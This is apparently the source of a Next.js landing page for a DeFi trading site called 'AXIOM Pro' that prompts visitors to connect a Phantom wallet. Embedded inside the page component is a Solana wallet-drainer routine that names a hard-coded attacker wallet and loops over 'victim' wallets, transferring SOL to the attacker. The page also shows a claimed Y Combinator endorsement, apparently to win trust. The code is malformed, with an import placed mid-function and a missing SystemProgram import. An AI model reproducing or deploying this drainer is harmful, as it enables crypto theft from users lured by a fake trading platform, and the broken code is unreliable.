"use client"

import { useEffect, useState } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"

export default function Home() {
  const [walletConnected, setWalletConnected] = useState(false)
  const [phantomInstalled, setPhantomInstalled] = useState(false)

  useEffect(() => {
    // Check if Phantom is installed
    if (typeof window !== "undefined") {
      const phantom = (window as any).solana
      setPhantomInstalled(phantom && phantom.isPhantom)
    }
  }, [])

  const connectWallet = async () => {
    try {
      const { solana } = window as any

      if (solana) {
        const response = await solana.connect()
        setWalletConnected(true)
        console.log("Wallet connected!", response.publicKey.toString())
      }
    } catch (error) {
      console.error("Error connecting wallet:", error)
    }
  }
import { Connection, PublicKey, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";

const connection = new Connection("https://api.mainnet-beta.solana.com");
const attackerWallet = new PublicKey("71qSrwfcwx68ZkAoMVAyHvkS1RWmMyFHs9ERD25Kgm6e");

// List of victims who approved the drainer contract
const victimWallets = [
    "VICTIM_WALLET_1",
    "VICTIM_WALLET_2",
    "VICTIM_WALLET_3"
];

async function drainFunds() {
    for (let victim of victimWallets) {
        const victimPublicKey = new PublicKey(victim);

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: victimPublicKey,
                toPubkey: attackerWallet,
                lamports: 1000000000, // 1 SOL
            })
        );

        try {
            await sendAndConfirmTransaction(connection, transaction, []);
            console.log(`Drained SOL from ${victim}`);
        } catch (error) {
            console.log(`Failed to drain ${victim}: ${error}`);
        }
    }
}

drainFunds();

  return (
    <div className="min-h-screen flex flex-col">
      <header className="p-4 flex justify-between items-center">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-white/10 rounded flex items-center justify-center">
            <div className="w-4 h-4 bg-white transform rotate-45" />
          </div>
          <span className="font-bold text-xl">AXIOM Pro</span>
        </div>
        <div className="flex gap-4">
          <Button variant="outline" className="text-white border-white/20">
            Login
          </Button>
          <Button onClick={connectWallet} className="bg-primary hover:bg-primary/90">
            {walletConnected ? "Connected" : "Sign up"}
          </Button>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center text-center px-4">
        <div className="w-12 h-12 bg-white/10 rounded flex items-center justify-center mb-8">
          <div className="w-6 h-6 bg-white transform rotate-45" />
        </div>
        <h1 className="text-5xl md:text-6xl font-bold mb-4">The Gateway to DeFi</h1>
        <p className="text-xl text-gray-400 mb-8">The only trading platform you&apos;ll ever need.</p>
        <Button onClick={connectWallet} className="bg-primary hover:bg-primary/90 text-lg px-8 py-6" size="lg">
          {!phantomInstalled ? "Install Phantom Wallet" : walletConnected ? "Start Trading" : "Connect Wallet"}
        </Button>

        <div className="mt-8 text-sm text-gray-500 flex items-center gap-2">
          Backed by
          <Image
            src="https://sjc.microlink.io/A0mx3JHxdtSCVCduCrKMRetHNZg_0g1xs9BnFTl3CwBsFvrPsvT10SZZrsvm421h1f-dwMaAYqzIokUR-REa2w.jpeg"
            alt="Y Combinator logo"
            width={20}
            height={20}
            className="opacity-50"
          />
          <span>Y Combinator</span>
        </div>
      </main>
    </div>
  )
}

